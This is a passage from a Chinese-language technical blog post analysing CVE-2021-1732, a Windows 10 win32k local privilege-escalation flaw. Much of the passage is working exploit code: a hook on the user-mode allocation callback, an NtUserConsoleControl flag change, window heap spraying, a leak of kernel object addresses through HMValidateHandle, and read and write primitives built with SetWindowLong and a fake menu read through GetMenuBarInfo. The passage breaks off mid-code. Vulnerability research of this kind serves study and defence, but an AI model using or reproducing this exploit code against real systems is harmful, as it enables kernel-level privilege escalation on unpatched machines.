title="user32!GetMenuBarInfo"></a>user32!GetMenuBarInfo</h3><p>xxxGetMenuBarInfo有NtUserGetMenuBarInfo调用，NtUserGetMenuBarInfo对应的用户态函数是GetMenuBarInfo</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095255357.png"></p><p>将参数传入内核层NtUserGetMenuBarInfo中继续运行</p><h3 id="win32kfull-NtUserGetMenuBarInfo"><a href="#win32kfull-NtUserGetMenuBarInfo" class="headerlink" title="win32kfull!NtUserGetMenuBarInfo"></a>win32kfull!NtUserGetMenuBarInfo</h3><p>读原语的主要调用函数，只要在窗口内部使用根据漏洞构造的写原语将我们自定义的spmenu插入即可</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095309342.png"></p><h3 id="win32kfull-xxxGetMenuBarInfo"><a href="#win32kfull-xxxGetMenuBarInfo" class="headerlink" title="win32kfull!xxxGetMenuBarInfo"></a>win32kfull!xxxGetMenuBarInfo</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095326320.png"></p><p>87:idObject必须要等于-3才能调用spmenu</p><p>95:赋值tagWND-&gt;spmenu到v58</p><p>107:传入的idItem必须大于0</p><p>109:获取ptagWNDK</p><p>112:当idItem为1,v38==v37==tagWND -&gt; spmenu + 0x58</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095338829.png"></p><p><strong>GetMenuBarInfo需要满足：</strong></p><p>1.idObject = -3</p><p>2.tagWnd -&gt; style包含WS_CHLD</p><p><strong>BarInfo是调用GetMenuBarInfo的最后的参数，保存着Menu的信息</strong></p><p>BarInfo -&gt; rcBar.left = pMenu -&gt; left + tagWnd -&gt;left</p><p>BarInfo -&gt; rcBar.right = pMenu -&gt; left + tagWnd -&gt; left + pMenu -&gt; right</p><h2 id="0x02漏洞利用"><a href="#0x02漏洞利用" class="headerlink" title="0x02漏洞利用"></a>0x02漏洞利用</h2><p>漏洞发生在Windows 图形驱动win32kfull!NtUserCreateWindowEx中一处由回调用户态导致offset可以自定义写入，而存在写入API在flag|0x800下越界写入offset指向地址导致的漏洞。</p><p>1.当驱动win32kfull.sys调用NtUserCreateWindowEx调用的xxxCreateWindowEx在调用xxxClientAllocWindowClassExtraBytes创建带窗口扩展内存的窗口时会判断tagWND­-&gt;cbWndExtra(窗口实例额外分配内存数)，该值不为空时调用win32kfull!xxxClientAllocWindowClassExtraBytes中的KeUserModeCallback函数回调系统调用表用户层user32!__xxxClientAllocWindowClassExtraBytes在用户层内存创建窗口扩展内存。</p><p>2.用户层创建的窗口扩展内存后分配的地址使用NtCallbackReturn函数修正堆栈后重新返回内核层并保存并继续运行，而当tagWND­-&gt;flag值包含0x800属性时候调用该值的offset进行寻址。攻击者可在回调函数内调用NtUserConsoleControl并传入当前窗口的句柄，将当前窗口内核结构中的一个成员(用于指明窗口扩展内存的区域)修改为offset，并修改相应的flag为0x800，指明该成员是一个offset。</p><p>3.攻击者可在回调函数中Hook位于user32.dll中的xxxClinetAllocWindowClassExtraBytes函数,在其调用的NtUserConsoleControl设置的窗口标志包含0x800属性，接着调用NtCallbackReturn返回任意值保存在tagWnd -&gt; ExtraBytes中，后续利用SetWindowLong系列函数时，将采用DeskHeap+offset的方式设置tagWnd-&gt;ExtraBytes，突破SetWindowLong长度限制，实现hWndMin越界写hWndMax写原语。获取读原语需要利用tagMenu,通过写源于修改tagWnd -&gt; spMenu为伪造的tagMenu，利用GetMenuBarInfo实现任意读。</p><p><strong>关键点:</strong></p><p>1.xxxCreateWindowEx回调用户态过程中存在Hook回调表自定义offset写入内核问题</p><p>2.NtUserConsoleControl设置flag这个功能与`SetWindowLong/SetWindowLongStr存在类型混淆问题</p><h3 id="tagWND结构体"><a href="#tagWND结构体" class="headerlink" title="tagWND结构体"></a>tagWND结构体</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">tagWND    <span class="token number">0x10</span> unknown        <span class="token number">0x00</span> pTEB            <span class="token number">0x220</span> <span class="token function">pEPROCESS</span><span class="token punctuation">(</span>of current process<span class="token punctuation">)</span>    <span class="token number">0x18</span> unknown        <span class="token number">0x80</span> kernel desktop heap base    <span class="token number">0x28</span> <span class="token function">tagWNDk</span><span class="token punctuation">(</span>Mapped to user layer<span class="token punctuation">)</span>  <span class="token operator">&lt;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>这个结构体映射到用户层        <span class="token number">0x00</span> hwnd        <span class="token number">0x08</span> kernel desktop heap base offset        <span class="token number">0x18</span> dwStyle        <span class="token number">0x28</span> Program entry         <span class="token number">0x58</span> indow Rect top        <span class="token number">0x5C</span> indow Rect left        <span class="token number">0x60</span> Window Rect buttom        <span class="token number">0x64</span> indow Rect right        <span class="token number">0x98</span> spMenu        <span class="token number">0xC8</span> cbWndExtra             长度值        <span class="token number">0xE8</span> dwExtraFlag            flag        <span class="token number">0xFC</span> unknown        <span class="token number">0x128</span> pExtraBytes           内存地址    <span class="token number">0xA8</span> spMenu        <span class="token number">0x28</span> unknown            <span class="token number">0x2C</span> unknown        <span class="token number">0x40</span> unknown            <span class="token number">0x44</span> unknown        <span class="token number">0x44</span> unknown        <span class="token number">0x58</span> unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="内核状态下窗口句柄地址"><a href="#内核状态下窗口句柄地址" class="headerlink" title="内核状态下窗口句柄地址"></a>内核状态下窗口句柄地址</h3><p>win32kfull!NtUserSetWindowLongPtr中存在利用ValidateHwndEx返回内核下的ptagWND地址的操作。</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095353261.png"></p><p>rdi寄存器储存的数据是ptagWND</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095407413.png"></p><p>搜索win32kfull!NtUserSetWindowLong地址,定位目标汇编位置</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095421319.png"></p><p>地址是fffffe23`0941c660，下断运行exp,查看rdi</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095500710.png"></p><p>rdi寄存器更新的数据就是ptagWND句柄的指针，tagWND地址fffffe52057bc640</p><h3 id="pEPROCESS"><a href="#pEPROCESS" class="headerlink" title="pEPROCESS"></a>pEPROCESS</h3><p>窗口句柄地址为fffffe52057bc640</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095519365.png"></p><p>偏移0x0是进程的Thread地址</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095528420.png"></p><pre class="line-numbers language-none"><code class="language-none">kd&gt; !dml_proc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095541004.png"></p><h3 id="Spmenu偏移"><a href="#Spmenu偏移" class="headerlink" title="Spmenu偏移"></a>Spmenu偏移</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095550574.png"></p><p>赋值源码</p><pre class="line-numbers language-none"><code class="language-none">// 4. build fake menu's bar infopFakeMenu[0] = (ULONG_PTR)&amp;ulFakeHandle;pFakeMenu[5] = (ULONG_PTR)pFakeMenuBody;// fake body((PULONG)(&amp;pFakeMenuBody[5]))[1] = 0xffff;// make items count to max((PULONG)(&amp;pFakeMenu[8]))[0] = 1;// make menu'x to 1((PULONG)(&amp;pFakeMenu[8]))[1] = 1;// make menu'y to 1pFakeMenu[0xb] = (ULONG_PTR)pFakeItems;// set fake menu's fake itemsulFakeRefCount[0] = (ULONG_PTR)pFakeMenu;pFakeMenu[0x13] = (ULONG_PTR)&amp;ulFakeRefCount;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="桌面堆地址"><a href="#桌面堆地址" class="headerlink" title="桌面堆地址"></a>桌面堆地址</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095609493.png"></p><h3 id="tagWNDK结构体"><a href="#tagWNDK结构体" class="headerlink" title="tagWNDK结构体"></a>tagWNDK结构体</h3><p>RECT结构体定义</p><pre class="line-numbers language-none"><code class="language-none">typedef struct tagRECT{LONG left;LONG top;LONG right;LONG bottom;}RECT, *PRECT, NEAR *NPRECT， FAR *LPRECT;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试源码</p><pre class="line-numbers language-none"><code class="language-none">##include &lt;windows.h&gt;##include &lt;winuser.h&gt;##include &lt;tlhelp32.h&gt;##include &lt;iostream&gt;##if 1##define DEBUG_BREAK()       __debugbreak();##else##define DEBUG_BREAK()##endif##define WND_NAME    L"WND"##define CLS_NAME    L"WND_CLS"##define DefWindowProc  DefWindowProcWusing HMVALIDATEHANDLE = VOID * (WINAPI*)(HWND hwnd, int type);HMVALIDATEHANDLE HMValidateHandle = NULL;BOOL FindHMValidateHandle() {    HMODULE hUser32 = LoadLibraryA("user32.dll");    if (hUser32 == NULL) {        printf("Failed to load user32");        return FALSE;    }    BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");    if (pIsMenu == NULL) {        printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");        return FALSE;    }    unsigned int uiHMValidateHandleOffset = 0;    for (unsigned int i = 0; i &lt; 0x1000; i++) {        BYTE* test = pIsMenu + i;        if (*test == 0xE8) {            uiHMValidateHandleOffset = i + 1;            break;        }    }    if (uiHMValidateHandleOffset == 0) {        printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");        return FALSE;    }    unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);    unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;    HMValidateHandle = (HMVALIDATEHANDLE)((ULONG_PTR)hUser32 + offset + 11);    return TRUE;}BOOL RegistWndClass(PCTSTR ClsName) {    WNDCLASS wndclass = { 0 };    wndclass.style = CS_HREDRAW | CS_VREDRAW;//窗口类型    wndclass.lpfnWndProc = DefWindowProc; //定义窗口处理函数    wndclass.cbClsExtra = 0;//窗口类扩展    wndclass.cbWndExtra = 0x100;//窗口实例无扩展    wndclass.hInstance = GetModuleHandle(NULL);;//当前实例句柄    wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);//窗口的最小化图标类型    wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);//窗口采用箭头光标    wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);//窗口背景色    wndclass.lpszMenuName = NULL;//窗口菜单    wndclass.lpszClassName = ClsName; //实际就是进程列表显示的名称    return !!RegisterClass(&amp;wndclass);}HWND CreateWnd(PCTSTR ClsName) {    HMENU hMenu = NULL;    HMENU hHelpMenu = NULL;    hMenu = CreateMenu();    hHelpMenu = CreateMenu();    AppendMenu(hHelpMenu, MF_STRING, 0x1888, TEXT("about"));    //0x1888是这个子菜单的句柄    AppendMenu(hMenu, MF_POPUP, (LONG)hHelpMenu, TEXT("help"));    return CreateWindowEx(NULL, ClsName, WND_NAME, NULL, 0, 0, 0, 0, NULL, hMenu, GetModuleHandle(NULL), NULL);}int main(){    HWND         hwnd;    PVOID pCurWndObj1 = NULL;    FindHMValidateHandle();    if (RegistWndClass(CLS_NAME)) //检查窗口是否注册成功    {        printf("RegisterClass successfull!\n");        hwnd = CreateWnd(CLS_NAME);        printf("hwnd == %X\n", hwnd);        pCurWndObj1 = HMValidateHandle((HWND)hwnd, 0x1);        printf("pCurWndObj1 == %llx\n", pCurWndObj1);        SetWindowLong(hwnd, 0x1c, 0x40c00000);                      RECT Rect = { 0 };        GetWindowRect(hwnd, &amp;Rect);        printf("left    == %llx\n", Rect.left);        printf("top     == %llx\n", Rect.top);        printf("right   == %llx\n", Rect.right);        printf("bottom  == %llx\n", Rect.bottom);        DEBUG_BREAK();        getchar();    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095623154.png"></p><p>tagWNDK从kernel映射到user的内存空间</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095634587.png"></p><p>RECT结构体</p><pre class="line-numbers language-none"><code class="language-none">typedef struct tagRECT{LONG left;    //0x58LONG top;     //0x50LONG right;   //0x68LONG bottom;  //0x60}RECT;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="hook函数分析"><a href="#hook函数分析" class="headerlink" title="hook函数分析"></a>hook函数分析</h3><pre class="line-numbers language-none"><code class="language-none">##include &lt;HookLib.h&gt;##pragma comment(lib, "Zydis.lib")##pragma comment(lib, "HookLib.lib")using USERMODECALLBACK = VOID(WINAPI*)( ULONG_PTR Para1, ULONG_PTR Para2, ULONG_PTR Para3, ULONG_PTR Para4 );USERMODECALLBACK UserModeCallback_Orig = NULL;SetHook((PVOID)(pUserModeCallbackTable[CALLBACK_INDEX]), UserModeCallback_Proxy, reinterpret_cast&lt;PVOID*&gt;(&amp;UserModeCallback_Orig));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当程序在CreateWindowEx回调了UserModeCallbackTable表上的第123项_xxxClientAllocWindowClassExtraBytes，就会跳转到Hook函数UserModeCallback_Proxy赋值。</p><p>在调用CreateWindowEx创建窗口过程中需要hook user32!_xxxClientAllocWindowClassExtraBytes跳转到hook函数，hook函数内部调用NtCallbackReturn伪造回调内核态参数功能返回一个自定义的pExtraBytes,然后自定义的pExtraBytes会返回到win32kfull!xxxClientAllocWindowClassExtraBytes,将pExtraBytes当作返回值返回到xxxCreateWindowEx，赋值tagWND-&gt;pExtraBytes</p><pre class="line-numbers language-none"><code class="language-none">VOID WINAPI UserModeCallback_Proxy(ULONG_PTR Para1, ULONG_PTR Para2, ULONG_PTR Para3, ULONG_PTR Para4){ULONG_PTR ulConsoleInfo[0x2] = { 0 };//调用NtUserConsoleControl需要构造0x10长度的参数ULONG_PTR ulRetBuffer[0x3] = { 0 };//调用NtCallbackReturn需要构造0x18长度的参数ULONG ulCurWnd = (ULONG)SprayWndHandles[SPRAY_WND_COUNT / 2];ULONG_PTR ulWndObjOff = 0x0;printf("UserMode Callback: %llx %llx %llx %llx\n", Para1, Para2, Para3, Para4 );printf( "Current window is Handle %X\n",  ulCurWnd);// since it was freed and occupied again , so the index increase one, details see my blog's article!{USHORT usHigh = (ulCurWnd &gt;&gt; 0x10) &amp; 0xffff;USHORT usLow = ulCurWnd &amp; 0xffff;ulCurWnd = ((usHigh + 1) &lt;&lt; 0x10) | usLow;//ulCurWnd是通过sprayHandle拿到的即将创建的窗口句柄值}DEBUG_BREAK();ulWndObjOff = GetWndObjOffset(ulCurWnd);printf("Current Window Object relative to DesktopHeap's offset:%X\n", ulWndObjOff);// trigle to change flag ulConsoleInfo[0] = ulCurWnd;NtUserConsoleControl(0x6, (PVOID)&amp;ulConsoleInfo, sizeof(ulConsoleInfo));//对tagWND-&gt;flag设置0x800属性ulRetBuffer[0] = ulWndObjOff;NtCallbackReturn(&amp;ulRetBuffer, sizeof(ulRetBuffer), 0x0);// hook: call origin function, in this case, don't need, due to USER32!_xxxClientAllocWindowClassExtraBytes's internal call NtCallbackReturn//UserModeCallback_Orig(Para1, Para2, Para3, Para4);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SprayHandler"><a href="#SprayHandler" class="headerlink" title="SprayHandler"></a>SprayHandler</h3><p>创建大量窗口堆后销毁尽量靠中的窗口，再创建一个窗口桌面堆会优先使用休闲的空间，由于之前创建的窗口挤压了堆空间，可以大概率获得原来销毁的窗口，根据窗口句柄生成的规律预知构造一个即将创建的窗口的句柄表示我们现在创建的窗口。</p><p><strong>利用SprayHandle的条件：</strong></p><p>1.创建足够多的窗口压缩堆空间，在下次调用的时候优先调用之前使用过的休闲空间。</p><p>2.对窗口句柄进行规律构造，生成即将生成的窗口句柄，在尚未创建窗口前就使用某写只要调用句柄的API</p><pre class="line-numbers language-none"><code class="language-none">if (RegistWndClass(CLS_NAME) ) {for (int i = 0; i &lt; SPRAY_WND_COUNT; i++) {SprayWndHandles[i] = CreateWnd(CLS_NAME);}//挤压分配堆空间printf("SprayWndHandles[%x] == %X \n", SPRAY_WND_COUNT / 2, SprayWndHandles[SPRAY_WND_COUNT / 2]);DestroyWindow(SprayWndHandles[SPRAY_WND_COUNT/2]);//摧毁靠中的窗口，释放这个窗口下属的堆块SetHook((PVOID)(pUserModeCallbackTable[CALLBACK_INDEX]), UserModeCallback_Proxy, reinterpret_cast&lt;PVOID*&gt;(&amp;UserModeCallback_Orig));//创建一个新窗口触发Hook载入flag 0x800属性HWND hTargetWnd = CreateWnd(CLS_NAME);printf("hTargetWnd == %X\n", hTargetWnd);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放的堆块是大范围正在利用堆中的唯一空闲堆，所以知道分配的规律就能继续利用这个堆块。</p><pre class="line-numbers language-none"><code class="language-none">{USHORT usHigh = (ulCurWnd &gt;&gt; 0x10) &amp; 0xffff;USHORT usLow = ulCurWnd &amp; 0xffff;ulCurWnd = ((usHigh + 1) &lt;&lt; 0x10) | usLow;//ulCurWnd是通过sprayHandle拿到的即将创建的窗口句柄值}HWND CreateWnd( PCTSTR ClsName ) {return CreateWindowEx(NULL, ClsName, WND_NAME, NULL, 0, 0, 0, 0, NULL, NULL, GetModuleHandle(NULL), NULL);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="HMVaildateHandle获取hwnd句柄地址"><a href="#HMVaildateHandle获取hwnd句柄地址" class="headerlink" title="HMVaildateHandle获取hwnd句柄地址"></a>HMVaildateHandle获取hwnd句柄地址</h3><p>HMAllocObject创建了桌面堆类型句柄后，会把tagWND对象放入到内核模式到用户模式内存映射的地址里，为了验证句柄的有效性，窗口管理器会调用User32!HMVaildateHandle函数读取这个表，将函数句柄和句柄类型作为参数，并在句柄中查找对应的向，查找到对象返回tagWND只读映射的对象指针，通过tagWND这个对象获取到句柄和窗口信息。使用IsMenu第一个call定位函数</p><pre class="line-numbers language-none"><code class="language-none">using HMVALIDATEHANDLE = VOID* (WINAPI*)(HWND hwnd, int type);HMVALIDATEHANDLE HMValidateHandle = NULL;//定义HMVALIDATEHANDLE类型结构体装在HMValidateHandle函数BOOL FindHMValidateHandle() {//找到HMValidateHandleHMODULE hUser32 = LoadLibraryA("user32.dll");if (hUser32 == NULL) {printf("Failed to load user32");return FALSE;}BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");if (pIsMenu == NULL) {printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");return FALSE;}unsigned int uiHMValidateHandleOffset = 0;for (unsigned int i = 0; i &lt; 0x1000; i++) {BYTE* test = pIsMenu + i;if (*test == 0xE8) {uiHMValidateHandleOffset = i + 1;break;}}if (uiHMValidateHandleOffset == 0) {printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");return FALSE;}unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;HMValidateHandle = (HMVALIDATEHANDLE)((ULONG_PTR)hUser32 + offset + 11);//找HMValidateHandle基址return TRUE;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用HMVaildateHandle寻找hwnd句柄地址</p><pre class="line-numbers language-none"><code class="language-none">pCurWndObj = HMValidateHandle((HWND)hwnd, 0x1);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="tagWND与桌面堆基址偏移计算"><a href="#tagWND与桌面堆基址偏移计算" class="headerlink" title="tagWND与桌面堆基址偏移计算"></a>tagWND与桌面堆基址偏移计算</h3><pre class="line-numbers language-none"><code class="language-none">ULONG GetWndObjOffset(ULONG_PTR hwnd ) {PVOID pCurWndObj = NULL;ULONG_PTR ulWndObjOff = 0x0;ULONG_PTR ulTebAddr = 0;ulTebAddr = __readgsqword(0x30);//获取teb基址pCurWndObj = HMValidateHandle((HWND)hwnd, 0x1);//利用HMValidateHandle寻找句柄地址，桌面窗口固定参数是0x1ulWndObjOff = (ULONG_PTR)pCurWndObj - *(ULONG_PTR*)(ulTebAddr + TEB_DESKTOPHEAP_OFF);//窗口tagWND相对用户层桌面堆地址偏移return ulWndObjOff;//返回窗口hTargetWnd与进程用户堆基址偏移}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到tagWND与用户进程桌面堆地址偏移后，就知道内核层窗口tagWND地址</p><h3 id="Write-Primitive"><a href="#Write-Primitive" class="headerlink" title="Write Primitive"></a>Write Primitive</h3><p>SetWindowLongPtr:任意地址写入</p><p>SetWindowLong:任意地址写入</p><p>NtCallbackReturn:自定义offset(pExtraBytes)</p><p>NtUserConsoleControl:设置flag</p><p>在flag | 0x800 + 载入的自定义pExtraBytes下调用SetWindowLong/SetWindowLongStr,可以进行任意地址写入。</p><p>写入的长度有cbWndExtra长度限制，需要先设置足够大的cbWndExtra</p><pre class="line-numbers language-none"><code class="language-none">SetWindowLongPtr(hTargetWnd, TAGWND_BODY_EXTRA_SIZE_OFF, (ULONG_PTR)-1);//修改cbWNDExtraSetWindowLong(hAdjacentWnd, 0x498 + 0x30, 0x7);//hAdjacentWnd窗口中的pExtraBytes作为offset自定义写入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Read-Primitive"><a href="#Read-Primitive" class="headerlink" title="Read Primitive"></a>Read Primitive</h3><p>使用写原语将自定义的用户层spmenu载入内核层tagWND-&gt;spmenu,使用GetMenuBarInfo读取。通过GetMenuBarInfo信息泄露指定地址数据。</p><pre class="line-numbers language-none"><code class="language-none">ULONG_PTR ReadPrimitive( HWND TargetWnd ) {MENUBARINFO menuBarInfo;ULONG_PTR ulValue0, ulValue1;menuBarInfo.cbSize = sizeof(menuBarInfo);//menuBarInfo初始化GetMenuBarInfo(TargetWnd, OBJID_MENU, 0x1, &amp;menuBarInfo);ReBuildData(&amp;menuBarInfo, &amp;ulValue0, &amp;ulValue1);//将调用GetMenuBarInfo返回的menuBarInfo中的4字节RECT.left和4字节RECT.topreturn ulValue0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将从泄露的2个32位地址的RECT.left和RECT.right重构64位地址</p><pre class="line-numbers language-none"><code class="language-none">VOID ReBuildData( PMENUBARINFO MenuBarInfoPtr, ULONG_PTR* RetValue0, ULONG_PTR* RetValue1 ) {ULONG_PTR ulValue0 = MAKE_64BIT_VALUE((ULONG)(MenuBarInfoPtr-&gt;rcBar.top), (ULONG)(MenuBarInfoPtr-&gt;rcBar.left));*RetValue0 = ulValue0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>menuBarInfo结构体</strong></p><pre class="line-numbers language-none"><code class="language-none">typedef struct tagMENUBARINFO{    DWORD cbSize;    RECT rcBar;          // rect of bar, popup, item    &lt;===这个就是泄露地址的结构体成员    HMENU hMenu;         // real menu handle of bar, popup    HWND hwndMenu;       // hwnd of item submenu if one    BOOL fBarFocused:1;  // bar, popup has the focus    BOOL fFocused:1;     // item has the focus    BOOL fUnused:30;     // reserved} MENUBARINFO, *PMENUBARINFO, *LPMENUBARINFO;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">ULONG_PTR <span class="token function">GetCurThreadObjAddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   HANDLE hThread <span class="token operator">=</span> INVALID_HANDLE_VALUE<span class="token punctuation">;</span>   ULONG_PTR ulAddr <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>   hThread <span class="token operator">=</span> <span class="token function">OpenThread</span><span class="token punctuation">(</span>THREAD_QUERY_INFORMATION<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token function">GetCurrentThreadId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>hThread <span class="token operator">!=</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span><span class="token punctuation">{</span>      ulAddr <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token function">GetTargetHandleObject</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcessId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> ulAddr<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//==========================================================================</span><span class="token punctuation">{</span>ULONG_PTR ulDesktopHeapBase <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>ULONG_PTR ulFakeHandle <span class="token operator">=</span> <span class="token number">0xFFFF</span><span class="token punctuation">;</span>ULONG_PTR ulFakeRefCount<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>PULONG_PTR pFakeMenu <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>PULONG_PTR pFakeMenuBody <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>PULONG_PTR pFakeItems <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>PVOID pCurWndObj1 <span class="token operator">=</span> 